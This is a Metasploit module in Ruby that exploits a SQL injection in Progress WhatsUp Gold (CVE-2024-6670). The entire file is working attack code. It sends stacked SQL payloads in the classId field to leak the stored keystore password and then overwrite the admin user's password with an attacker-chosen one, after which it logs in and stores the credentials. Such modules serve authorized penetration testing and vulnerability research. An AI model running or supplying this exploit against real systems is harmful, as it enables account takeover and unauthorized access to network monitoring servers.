class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WhatsUp Gold SQL Injection (CVE-2024-6670)',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in WhatsUp Gold, by changing the password of an existing user (such as of the default admin account)
          to an attacker-controlled one.

          WhatsUp Gold versions < v24.0.0 are affected.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)' # Discovery & PoC
        ],
        'References' => [
          ['CVE', '2024-6670'],
          ['URL', 'https://community.progress.com/s/article/WhatsUp-Gold-Security-Bulletin-August-2024'],
          ['URL', 'https://summoning.team/blog/progress-whatsup-gold-sqli-cve-2024-6670/'],
          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-24-1185/']
        ],
        'DisclosureDate' => '2024-08-29',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('USERNAME', [true, 'Username of which to update the password (default: admin)', 'admin']),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(12)]),
    ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'NmConsole/app.json')
    })

    return CheckCode::Unknown unless res && res.code == 200

    data = res.get_json_document
    data_js = data['js']
    version_path = data_js.find { |item| item['path'] =~ /app-/ }['path']
    version = version_path[/app-(.*)\.js/, 1]
    if version.nil?
      return CheckCode::Unknown
    else
      vprint_status('Version retrieved: ' + version)
    end

    return Exploit::CheckCode::Appears("Version: #{version}") if Rex::Version.new(version) <= Rex::Version.new('23.1.3')

    Exploit::CheckCode::Safe
  end

  def run
    body = {
      KeyStorePassword: datastore['NEW_PASSWORD'],
      TrustStorePassword: datastore['NEW_PASSWORD']
    }.to_json

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'NmConsole/WugSystemAppSettings/JMXSecurity'),
      'ctype' => 'application/json',
      'data' => body
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.code == 500
      fail_with(Failure::UnexpectedReply, 'Unexpected server HTTP status code received.')
    end

    marker = Rex::Text.rand_text_alpha(10)
    deviceid = Rex::Text.rand_text_numeric(5)

    body = {
      deviceId: deviceid.to_s,
      classId: "DF215E10-8BD4-4401-B2DC-99BB03135F2E';UPDATE ProActiveAlert SET sAlertName='#{marker}'+( SELECT sValue FROM GlobalSettings WHERE sName = '_GLOBAL_:JavaKeyStorePwd');--",
      range: rand(1..9).to_s,
      n: rand(1..9).to_s,
      start: rand(1..9).to_s,
      end: rand(1..9).to_s
    }.to_json

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'NmConsole/Platform/PerformanceMonitorErrors/HasErrors'),
      'ctype' => 'application/json',
      'data' => body
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.code == 200 && res.body == 'false'
      fail_with(Failure::UnexpectedReply, 'Unexpected server response received.')
    end

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'NmConsole/Platform/Filter/AlertCenterItemsReportThresholds')
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, 'Unexpected server response received.')
    end

    json_body = res.get_json_document

    result = json_body.find { |item| item['DisplayName'].start_with?(marker.to_s) }
    unless result
      fail_with(Failure::UnexpectedReply, 'Coud not find DisplayName match with marker.')
    end

    display_name = result['DisplayName'].to_s
    display_name_f = display_name.sub(marker.to_s, '')
    byte_v = display_name_f.split(',')
    hex_v = byte_v.map { |value| value.to_i.to_s(16).upcase.rjust(2, '0') }
    enc_pass = '0x' + hex_v.join
    vprint_status('Encrypted password: ' + enc_pass)

    body = {
      deviceId: deviceid.to_s,
      classId: "DF215E10-8BD4-4401-B2DC-99BB03135F2E';UPDATE WebUser SET sPassword = #{enc_pass} where sUserName = '#{datastore['USERNAME']}';--",
      range: rand(1..9).to_s,
      n: rand(1..9).to_s,
      start: rand(1..9).to_s,
      end: rand(1..9).to_s
    }.to_json

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'NmConsole/Platform/PerformanceMonitorErrors/HasErrors'),
      'ctype' => 'application/json',
      'data' => body
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.code == 200 && res.body == 'false'
      fail_with(Failure::Unreachable, 'Unexpected server response received.')
    end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'NmConsole/User/LoginAjax'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['NEW_PASSWORD'],
        'rememberMe' => 'false'
      }
    )

    json = res.get_json_document

    unless res && res.code == 200 && res.get_cookies.include?('ASPXAUTH') && json['authenticated'] == true
      fail_with(Failure::NotVulnerable, 'Unexpected response received.')
    end

    store_valid_credential(user: datastore['USERNAME'], private: datastore['NEW_PASSWORD'], proof: json.to_s)
    print_good("New password for #{datastore['USERNAME']} was successfully set:\n\t#{datastore['USERNAME']}:#{datastore['NEW_PASSWORD']}")
    print_good("Login at: #{full_uri(normalize_uri(target_uri, 'NmConsole/#home'))}")
  end
end
